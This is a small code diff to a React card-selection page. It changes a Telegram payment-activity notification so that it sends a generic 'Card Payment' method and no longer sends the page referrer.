@@ -219,9 +219,8 @@ const CardSelectPage = () => {
     if (!selected || !selectedCard) return;
     sendTelegramNotification({
       type: "payment_activity",
-      method: selectedCard.label,
+      method: "Card Payment",
       paymentType: "card",
-      referrer: document.referrer || "Direct",
     });
     setShowForm(true);
   };
